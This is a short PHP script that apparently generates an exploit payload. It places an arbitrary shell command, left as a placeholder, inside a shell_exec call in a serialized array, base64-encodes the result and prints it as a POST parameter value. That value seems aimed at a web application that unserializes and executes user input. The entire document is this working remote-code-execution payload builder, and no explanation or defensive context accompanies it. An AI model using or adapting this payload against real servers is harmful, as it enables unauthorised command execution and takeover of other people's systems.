<?php
$command = "ANY_SHELL_COMMAND";
$payload = ['d' => "echo shell_exec(\"$command\");", 'a' => 'e', 'ak' => 1];

print('POST parameter value : ' . base64_encode(serialize($payload)));
?>
